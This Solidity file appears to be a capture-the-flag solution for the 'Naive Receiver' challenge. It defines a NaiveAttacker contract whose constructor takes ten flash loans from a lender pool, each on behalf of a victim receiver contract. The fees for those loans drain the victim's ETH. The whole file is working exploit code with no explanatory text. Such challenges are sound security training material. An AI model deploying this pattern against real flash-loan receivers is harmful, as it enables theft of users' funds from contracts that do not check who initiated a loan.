// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveAttacker {
    constructor(address payable pool, address _address) {
        for (uint8 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(_address),
                address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
                1 ether,
                ""
            );
        }
    }
}
